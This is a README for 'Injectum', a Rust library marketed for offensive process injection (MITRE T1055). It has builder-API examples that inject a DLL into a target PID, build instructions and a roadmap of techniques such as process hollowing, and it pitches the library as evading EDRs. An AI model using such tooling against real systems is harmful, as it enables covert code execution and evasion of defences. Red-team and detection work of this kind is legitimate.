<h1 align="center">Injectum</h1>

<p align="center">
<em>The modern, type-safe framework for offensive process injection in Rust.</em>
</p>

<p align="center">
<a href="https://crates.io/crates/injectum">
<img src="https://img.shields.io/crates/v/injectum.svg" alt="Crates.io">
</a>
<a href="https://github.com/0x536b796ec3b578/injectum/blob/main/LICENSE">
<img src="https://img.shields.io/badge/license-MIT-blue.svg" alt="MIT Licensed">
</a>
</p>

<p align="center">
<a href="#architecture">Architecture</a> •
<a href="#how-it-works">How It Works</a> •
<a href="#installation">Installation</a> •
<a href="#build-instructions">Build</a> •
<a href="#roadmap---mitre-attck-process-injection-t1055">Roadmap</a> •
<a href="#contributing">Contributing</a>
</p>

## Overview
**Injectum** is a modular, type-safe Rust library for process injection in Rust. It abstracts away the headache of platform-specific implementations so you can focus on the strategy.

Think of it as the "Lego set" for offensive tradecraft: it provides a structured interface for executing various injection strategies (mapped to [MITRE ATT&CK T1055](https://attack.mitre.org/techniques/T1055/) techniques) while handling memory allocation, permission juggling, and thread creation safely.

**Why Injectum**?
- 🛡️ OpSec-Conscious: We don't promise invisibility (nothing can), but we default to the stealthiest known patterns and minimize artifacts to give you the best fighting chance against modern EDRs.
- 🦀 Memory Safety: Built on Rust to prevent crashes in your loader, because a crashed loader is a detected loader.
- 🧩 Modular Architecture: Swap injection techniques (T1055.xxx) dynamically without rewriting your core logic.
- 🚀 Developer Experience: A fluent, type-safe Builder API that catches errors at compile time, not runtime.

## Architecture
The library is built around a unidirectional data flow: `Builder` $\to$ `Configuration` $\to$ `Factory` $\to$ `Execution`.

### 1. The Builder Pattern
The primary entry point is the InjectorBuilder. It provides a fluent interface to construct an immutable injection configuration, ensuring all components (Strategy, Payload, Target) are valid before execution.
- **Initialization**: `InjectorBuilder::new()` starts the chain.
- **Validation**: The `build()` method enforces the presence of a strategy and payload.
- **Execution**: The builder allows immediate execution via `.execute()`.

### 2. Payload & Metadata
Payloads are strongly typed via the `Payload` enum to prevent misuse.
- **Variants**: Supports `Shellcode`, `DllFile`, `Executable`, `Script`, and generic `Blob`.
- **Metadata**: Every payload includes `PayloadMetadata` for OpSec tracking (origin, description) and safety checks (e.g., `safe_sample` flag).

### 3. Target Abstraction 
The **Target** enum abstracts the destination.
- **PID**: Targets a specific process ID (`Target::Pid(u32)`).
- **None**: For self-injection or strategies that spawn their own targets (`Target::None`).

### 4. Strategy Factory
Strategies are instantiated at runtime based on the `StrategyType`.
- **Feature Gating**: Strategies are gated by Cargo features (e.g., `feature = "T1055_001"`) to minimize binary size.
- **Resolution**: The `Factory` matches the requested technique to its concrete implementation.

### 5. The Execution Engine
The `Injector` serves as the stateless runner.
- **Pre-flight Checks**: Validates compatibility (e.g., does the strategy require a PID?).
- **Error Propagation**: Returns `Result<(), InjectumError>` for granular error handling.

## How It Works

### Basic Usage with `Injector`
```rust
use injectum::{Injector, Payload, PayloadMetadata, StrategyType, Target, Technique};
use std::path::PathBuf;

fn main() {
    // 1. Define the payload
    let payload = Payload::DllFile {
        path: Some(PathBuf::from("C:\\temp\\payload.dll")),
        image: None,
         meta: PayloadMetadata::default(),
    };
    
    // 2. Define the target
    let target = Target::Pid(1234);
    
    // 3. Select the strategy (T1055.001 -> "DLLInjection")
    let strategy = StrategyType::new(Technique::T1055_001, Some("DLLInjection"));

    // 4. Run
    match Injector::run(strategy, &payload, &target) {
        Ok(_) => println!("Injection succeeded."),
        Err(e) => eprintln!("Injection failed: {:?}", e),
    }
}
```

### Using the Builder API
```rust
use injectum::{InjectorBuilder, Payload, PayloadMetadata, StrategyType, Target, Technique};

fn main() {
    let payload = Payload::DllFile {
        path: Some(PathBuf::from("C:\\temp\\payload.dll")),
        image: None, 
        meta: PayloadMetadata {
            description: Some("Production Payload".into()),
            safe_sample: false,
            ..Default::default()
        }
    };

    let result = InjectorBuilder::new()
        .strategy(StrategyType::new(Technique::T1055_001, Some("DLLInjection")))
        .payload(payload)
        .target(Target::Pid(1234))
        .execute();

    if let Err(e) = result {
        eprintln!("Injection failed: {:?}", e);
    }
}
```

## Installation
Run the following Cargo command in your project directory:
```bash
cargo add injectum
```

Or add the following line to your `Cargo.toml`:
```toml
injectum = "0.1.0"
```

## Build Instructions

**Before building, please check the configuration file**:
1. Open `.cargo/config.toml`.
2. Windows Users: Comment out the `linker = "lld-link"` line.
3. Linux Users: Ensure `linker = "lld-link"` is uncommented.

### Native Windows
Requires the MSVC toolchain (Visual Studio Build Tools).
```powershell
cargo build --release
```

### Cross-Compilation from Linux
This library relies on the proprietary MSVC runtime libraries. The easiest way to compile from Linux is using [cargo-xwin](https://github.com/rust-cross/cargo-xwin).

1. Install `cargo-xwin`:
```bash
cargo install cargo-xwin
```

2. Build with the MSVC target:
```bash
cargo xwin build --example T1055_001_DLL_Injection --features "tracing,T1055_001" --release
```

## Roadmap - MITRE ATT&CK Process Injection (T1055)
Injectum aims to provide a modular, feature‑gated implementation of the full set of process‑injection techniques referenced in the [MITRE ATT&CK framework](https://attack.mitre.org/techniques/T1055/).

| ID | Name |Status | 
| :--- | :--- | :--- |
| [T1055.001](https://attack.mitre.org/techniques/T1055/001/) | Dynamic-link Library Injection | [x] |
| [T1055.002](https://attack.mitre.org/techniques/T1055/002/) | Portable Executable Injection | [ ] |
| [T1055.003](https://attack.mitre.org/techniques/T1055/003/) | Thread Execution Hijacking | [ ] |
| [T1055.004](https://attack.mitre.org/techniques/T1055/004/) | Asynchronous Procedure Call | [ ] |
| [T1055.005](https://attack.mitre.org/techniques/T1055/005/) | Thread Local Storage | [ ] |
| [T1055.008](https://attack.mitre.org/techniques/T1055/008/) | Ptrace System Calls | [ ] |
| [T1055.009](https://attack.mitre.org/techniques/T1055/009/) | Proc Memory | [ ] |
| [T1055.011](https://attack.mitre.org/techniques/T1055/011/) | Extra Window Memory Injection | [ ] |
| [T1055.012](https://attack.mitre.org/techniques/T1055/012/) | Process Hollowing | [ ] |
| [T1055.013](https://attack.mitre.org/techniques/T1055/013/) | Process Doppelgänging | [ ] |
| [T1055.014](https://attack.mitre.org/techniques/T1055/014/) | VDSO Hijacking | [ ] |
| [T1055.015](https://attack.mitre.org/techniques/T1055/015/) | ListPlanting | [ ] |

## Contributing
Contributions are welcome!
- Adding new injection strategies
- Writing comprehensive tests
- Benchmarking performance

Ensure your code is properly formatted:
```bash
cargo fmt
cargo clippy
```

## Supporting
Author: *Skynõx*

If you'd like to support the project, you can donate via the following addresses:
| Bitcoin  | bc1q87r2z8szxwqt538edzw5gl397c9v3hzxwjw82h |
| :------- | :----------------------------------------- |
| Ethereum | 0xe277049067F72E89326c2C0D11333531d5BbB78B |
